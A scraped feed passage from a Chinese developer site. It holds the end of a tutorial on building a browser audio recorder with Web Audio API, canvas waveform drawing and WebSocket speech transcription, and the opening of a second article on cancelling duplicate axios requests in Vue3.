    <span class="hljs-keyword">const</span> { barWidth, barSpacing, minHeight, barColor, gradientColor } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    <span class="hljs-keyword">const</span> ctx = <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>;
    <span class="hljs-keyword">const</span> centerY = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>;

    <span class="hljs-comment">// 清除画布</span>
    ctx.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">height</span>);

    <span class="hljs-comment">// 绘制中心线</span>
    ctx.<span class="hljs-title function_">beginPath</span>();
    ctx.<span class="hljs-title function_">moveTo</span>(<span class="hljs-number">0</span>, centerY);
    ctx.<span class="hljs-title function_">lineTo</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span>, centerY);
    ctx.<span class="hljs-property">strokeStyle</span> = <span class="hljs-string">'rgba(255, 255, 255, 0.2)'</span>;
    ctx.<span class="hljs-property">lineWidth</span> = <span class="hljs-number">1</span>;
    ctx.<span class="hljs-title function_">stroke</span>();

    <span class="hljs-comment">// 计算每个柱子的总宽度（柱子宽度+间距）</span>
    <span class="hljs-keyword">const</span> totalBarWidth = barWidth + barSpacing;

    <span class="hljs-comment">// 计算可以绘制的柱子数量</span>
    <span class="hljs-keyword">const</span> maxBars = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span> / totalBarWidth);

    <span class="hljs-comment">// 创建渐变</span>
    <span class="hljs-keyword">const</span> gradient = ctx.<span class="hljs-title function_">createLinearGradient</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 水平方向</span>
    gradient.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">0</span>, barColor);
    gradient.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">0.5</span>, gradientColor);
    gradient.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">1</span>, barColor);

    <span class="hljs-comment">// 计算最小高度（基于画布高度的百分比）</span>
    <span class="hljs-keyword">const</span> minHeightPixels = (minHeight / <span class="hljs-number">100</span>) * centerY;

    <span class="hljs-comment">// 处理数据以增强波动效果</span>
    <span class="hljs-keyword">const</span> processedData = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">processData</span>(dataArray);

    <span class="hljs-comment">// 绘制柱子  水平方向渐变</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; maxBars &amp;&amp; i &lt; processedData.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-comment">// 计算柱子的x位置</span>
      <span class="hljs-keyword">const</span> x = i * totalBarWidth;

      <span class="hljs-comment">// 获取处理后的数据值</span>
      <span class="hljs-keyword">const</span> value = processedData[i];

      <span class="hljs-comment">// 计算实际高度，确保不低于最小高度</span>
      <span class="hljs-keyword">const</span> dynamicHeight = (value / <span class="hljs-number">255</span>) * (centerY - <span class="hljs-number">20</span>);
      <span class="hljs-keyword">const</span> height = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(minHeightPixels, dynamicHeight);

      <span class="hljs-comment">// 绘制上下对称的柱子</span>
      ctx.<span class="hljs-property">fillStyle</span> = gradient;
      ctx.<span class="hljs-title function_">fillRect</span>(x, centerY - height, barWidth, height * <span class="hljs-number">2</span>);
    }
  }

  <span class="hljs-comment">// 开始绘制</span>
  <span class="hljs-title function_">start</span>(<span class="hljs-params">dataGenerator, interval = <span class="hljs-number">100</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isDrawing</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDrawing</span> = <span class="hljs-literal">true</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">drawFrame</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isDrawing</span>) <span class="hljs-keyword">return</span>;

      <span class="hljs-comment">// 获取数据并绘制</span>
      <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">dataGenerator</span>();
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setData</span>(data);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">draw</span>(data);

      <span class="hljs-comment">// 继续动画</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">animationId</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">requestAnimationFrame</span>(drawFrame);
      }, interval);
    };

    <span class="hljs-title function_">drawFrame</span>();
  }

  <span class="hljs-comment">// 停止绘制</span>
  <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDrawing</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">animationId</span>) {
      <span class="hljs-built_in">clearTimeout</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">animationId</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">animationId</span> = <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">// 清除画布</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">height</span>);

    <span class="hljs-comment">// 绘制停止状态文本</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'rgba(255, 255, 255, 0.7)'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-property">font</span> = <span class="hljs-string">'24px Arial'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-property">textAlign</span> = <span class="hljs-string">'center'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">'已停止绘制'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span> / <span class="hljs-number">2</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>);
  }
}

<span class="hljs-comment">// 模拟录音数据生成器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDataGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> frameCount = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> dataArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">1024</span>);

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; dataArray.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-comment">// 基础噪声</span>
      <span class="hljs-keyword">let</span> value = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">20</span>;

      <span class="hljs-comment">// 添加一些周期性波形</span>
      value += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(i / <span class="hljs-number">20</span> + frameCount / <span class="hljs-number">20</span>) * <span class="hljs-number">30</span>;
      value += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(i / <span class="hljs-number">5</span> + frameCount / <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>;

      <span class="hljs-comment">// 随机峰值</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.97</span>) {
        value += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>;
      }

      <span class="hljs-comment">// 确保值在0-255范围内</span>
      dataArray[i] = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">255</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, value));
    }

    frameCount++;
    <span class="hljs-keyword">return</span> dataArray;
  };
}

<span class="hljs-comment">// 无声数据生成器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createSilenceDataGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-comment">// 返回全0数组模拟无声</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">1024</span>);
  };
}

<span class="hljs-keyword">export</span> {
  <span class="hljs-title class_">WaveformVisualizer</span>,
  createDataGenerator,
  createSilenceDataGenerator
}
</code></pre>
<p><strong>2) 时域波形 (waveTimeDomain.js)</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">draw</span>(<span class="hljs-params">dataArray</span>) {
  <span class="hljs-comment">// 转换数据范围 [0, 255] → [-1, 1]</span>
  <span class="hljs-keyword">let</span> value = (dataArray[i] - <span class="hljs-number">128</span>) / <span class="hljs-number">128</span>;
  
  <span class="hljs-comment">// 绘制连续波形线</span>
  ctx.<span class="hljs-title function_">beginPath</span>();
  ctx.<span class="hljs-title function_">moveTo</span>(<span class="hljs-number">0</span>, firstY);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; processedData.<span class="hljs-property">length</span>; i++) {
    ctx.<span class="hljs-title function_">lineTo</span>(x, y);
  }
  ctx.<span class="hljs-title function_">stroke</span>();
}
</code></pre>
<h3 data-id="heading-13">四、使用步骤</h3>
<h4 data-id="heading-14">4.1 基础录音</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Recorder</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"js-audio-recorder"</span>;

<span class="hljs-comment">// 1. 创建实例</span>
<span class="hljs-keyword">const</span> recorder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Recorder</span>({
  <span class="hljs-attr">sampleRate</span>: <span class="hljs-number">16000</span>,
  <span class="hljs-attr">sampleBits</span>: <span class="hljs-number">16</span>,
  <span class="hljs-attr">numChannels</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">compiling</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// 开启边录边转</span>
});

<span class="hljs-comment">// 2. 监听处理事件</span>
recorder.<span class="hljs-property">onprogress</span> = <span class="hljs-function">(<span class="hljs-params">{ duration, fileSize, vol, data }</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`录音时长: <span class="hljs-subst">${duration}</span>秒`</span>);
};

<span class="hljs-comment">// 3. 开始录音</span>
<span class="hljs-keyword">await</span> recorder.<span class="hljs-title function_">start</span>();

<span class="hljs-comment">// 4. 暂停/继续</span>
recorder.<span class="hljs-title function_">pause</span>();
recorder.<span class="hljs-title function_">resume</span>();

<span class="hljs-comment">// 5. 停止并获取WAV</span>
recorder.<span class="hljs-title function_">stop</span>();
<span class="hljs-keyword">const</span> blob = recorder.<span class="hljs-title function_">getWAVBlob</span>();

<span class="hljs-comment">// 6. 销毁</span>
<span class="hljs-keyword">await</span> recorder.<span class="hljs-title function_">destroy</span>();
</code></pre>
<h4 data-id="heading-15">4.2 集成实时转写</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 建立WebSocket连接</span>
<span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">'wss://your-asr-service.com'</span>);
ws.<span class="hljs-property">binaryType</span> = <span class="hljs-string">'arraybuffer'</span>;

<span class="hljs-comment">// 2. 发送开始指令</span>
ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
  <span class="hljs-attr">header</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"StartTranscription"</span>, <span class="hljs-attr">namespace</span>: <span class="hljs-string">"SpeechTranscriber"</span> },
  <span class="hljs-attr">payload</span>: { <span class="hljs-attr">format</span>: <span class="hljs-string">"pcm"</span> }
}));

<span class="hljs-comment">// 3. 实时发送音频</span>
recorder.<span class="hljs-property">onprogress</span> = <span class="hljs-function">(<span class="hljs-params">{ data }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> latestPCM = data[data.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
  ws.<span class="hljs-title function_">send</span>(latestPCM);
};

<span class="hljs-comment">// 4. 接收识别结果</span>
ws.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(msg.<span class="hljs-property">data</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result.<span class="hljs-property">payload</span>.<span class="hljs-property">result</span>);
};
</code></pre>
<h3 data-id="heading-16">五、性能优化策略</h3>
<h4 data-id="heading-17">5.1 采样率压缩</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data, inputSampleRate, outputSampleRate</span>) {
  <span class="hljs-keyword">const</span> rate = inputSampleRate / outputSampleRate;
  <span class="hljs-comment">// 48kHz → 16kHz：每隔3个样本取1个</span>
  <span class="hljs-keyword">while</span> (index &lt; length) {
    result[index] = lData[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(j)];
    j += rate;
  }
}
</code></pre>
<h4 data-id="heading-18">5.2 内存管理</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 录音结束后及时清理</span>
<span class="hljs-title function_">clear</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">lBuffer</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">rBuffer</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">PCM</span> = <span class="hljs-literal">null</span>;
}

<span class="hljs-comment">// 销毁时关闭音频上下文</span>
<span class="hljs-title function_">destroy</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">stopStream</span>();  <span class="hljs-comment">// 停止媒体流</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">closeAudioContext</span>();  <span class="hljs-comment">// 关闭音频上下文</span>
}
</code></pre>
<h4 data-id="heading-19">5.3 波形绘制优化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 简化绘制：减少数据点</span>
<span class="hljs-keyword">const</span> step = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(processedData.<span class="hljs-property">length</span> / (<span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span> / <span class="hljs-number">2</span>));
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; processedData.<span class="hljs-property">length</span>; i += step) {
  <span class="hljs-comment">// 只绘制关键帧</span>
}
</code></pre>
<h3 data-id="heading-20">六、浏览器兼容性</h3>








































<table><thead><tr><th>特性</th><th>Chrome</th><th>Firefox</th><th>Safari</th><th>Edge</th></tr></thead><tbody><tr><td>getUserMedia</td><td>49+</td><td>44+</td><td>11+</td><td>79+</td></tr><tr><td>AudioContext</td><td>35+</td><td>25+</td><td>14.1+</td><td>79+</td></tr><tr><td>ScriptProcessorNode</td><td>14+</td><td>23+</td><td>6+</td><td>12+</td></tr><tr><td>WebSocket</td><td>16+</td><td>11+</td><td>7.1+</td><td>12+</td></tr></tbody></table>
<p><strong>注意事项</strong>：</p>
<ul>
<li>Safari 需要 HTTPS 环境</li>
<li>iOS Safari 有特殊的音频策略</li>
<li>部分浏览器需要用户交互后才能录音</li>
</ul>
<p>本地开发时解决非https不允许录音问题</p>
<p>由于chrome限制，因安全原因，不允许非安全环境下使用录音权限，这里可以通过配置chrome来解决
浏览器地址栏输入<code>chrome://flags/#unsafely-treat-insecure-origin-as-secure</code></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a58654e960404f60982e1dfecdf5040a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGx5Ynl0ZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770895465&amp;x-signature=Oq2e49BVleIlCRlGv2oyJOFWcvI%3D" alt="image.png" loading="lazy"/>
启用后，重启浏览器即可解决</p>
<h3 data-id="heading-21">七、总结</h3>
<p>这个项目展示了如何利用浏览器原生能力构建一个功能完整的录音工具：</p>
<ol>
<li><strong>Web Audio API</strong> 提供强大的音频处理能力</li>
<li><strong>边录边转</strong> 模式实现实时语音识别</li>
<li><strong>WebSocket</strong> 实现低延迟的双向通信</li>
<li><strong>Canvas</strong> 实现流畅的波形可视化</li>
</ol>
<p><strong>关键技术要点</strong>：</p>
<ul>
<li>PCM 数据的编码与格式转换</li>
<li>音频节点的连接与数据流转</li>
<li>阿里云 ASR 协议的正确实现</li>
<li>内存管理和性能优化</li>
</ul>
<hr/>
<p><strong>参考链接</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FWeb_Audio_API" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Audio_API" ref="nofollow noopener noreferrer">Web Audio API 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Ftingwu%2Finterface-and-implementation" target="_blank" title="https://help.aliyun.com/zh/tingwu/interface-and-implementation" ref="nofollow noopener noreferrer">阿里云听悟接口文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fjs-audio-recorder" target="_blank" title="https://www.npmjs.com/package/js-audio-recorder" ref="nofollow noopener noreferrer">js-audio-recorder - npm</a>record.js第三方库推荐</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在Vue3项目中如何取消重复请求？]]></title>    <link>https://juejin.cn/post/7603183929251708980</link>    <guid>https://juejin.cn/post/7603183929251708980</guid>    <pubDate>2026-02-05T12:03:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603183929251708980" data-draft-id="7602991346585714722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在Vue3项目中如何取消重复请求？"/> <meta itemprop="keywords" content="前端,面试"/> <meta itemprop="datePublished" content="2026-02-05T12:03:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户3905133219288"/> <meta itemprop="url" content="https://juejin.cn/user/3609051079121550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在Vue3项目中如何取消重复请求？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3609051079121550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户3905133219288
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:03:36.000Z" title="Thu Feb 05 2026 12:03:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>今天我们来聊聊一个实际开发中常见的问题：在Vue3项目中，如何取消重复的请求。</p>
<h2 data-id="heading-0">为什么需要取消重复请求？</h2>
<p>这样做有几个明显的好处：</p>
<ol>
<li> <strong>节省资源</strong>：释放浏览器连接，减轻服务器压力。</li>
<li> <strong>保证数据正确性</strong>：避免因请求响应顺序错乱导致页面显示旧数据。</li>
<li> <strong>提升用户体验</strong>：防止无效请求阻塞后续有效操作。</li>
</ol>
<p>在Vue3的生态中，我们最常用的HTTP客户端是 <code>axios</code>。因此，本文的核心将围绕如何使用 <code>axios</code> 的取消令牌（CancelToken）及其更现代的替代品——AbortController——来实现请求取消。</p>
<hr/>
<h2 data-id="heading-1">方案一：使用 Axios 的 CancelToken</h2>
<p><code>axios</code> 从很早就支持通过 <code>CancelToken</code> 来取消请求。虽然它在 <code>axios</code> v0.22.0 之后被标记为已弃用，转而推荐使用标准的 <code>AbortController</code>，但很多现有项目仍在使用这个API，所以我们有必要了解一下。
它的工作原理是：创建一个“取消令牌”的源（source），将这个令牌配置到请求中。当我们需要取消请求时，调用这个源的 <code>cancel</code> 方法。</p>
<h3 data-id="heading-2">基本使用示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-comment">// 1. 创建一个 CancelToken Source</span>
<span class="hljs-keyword">const</span> source = axios.<span class="hljs-property">CancelToken</span>.<span class="hljs-title function_">source</span>();

<span class="hljs-comment">// 2. 发起请求，并配置 cancelToken</span>
axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user/123'</span>, {
  <span class="hljs-attr">cancelToken</span>: source.<span class="hljs-property">token</span>
}).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">data</span>);
}).<span class="hljs-keyword">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">thrown</span>) {
  <span class="hljs-comment">// 判断错误是否是因为请求被取消</span>
  <span class="hljs-keyword">if</span> (axios.<span class="hljs-title function_">isCancel</span>(thrown)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'请求被取消:'</span>, thrown.<span class="hljs-property">message</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 处理其他错误</span>
  }
});

<span class="hljs-comment">// 3. 在需要的时候取消请求</span>
source.<span class="hljs-title function_">cancel</span>(<span class="hljs-string">'操作被用户取消'</span>);
</code></pre>
<h3 data-id="heading-3">在Vue3组件中管理重复请求</h3>
<p>在实际项目中，我们通常需要一种机制来管理“同一个”重复请求。一个常见的思路是：<strong>将每个请求的唯一标识（例如：请求方法+URL）和一个取消函数关联起来，在发起新请求前，检查并取消旧的、未完成的相同请求。</strong></p>
<p>我们可以利用Vue3的响应式系统和组合式API，封装一个可复用的逻辑。</p>
<p>首先，我们创建一个用于存储所有进行中请求的Map，以及相关的操作函数。</p>
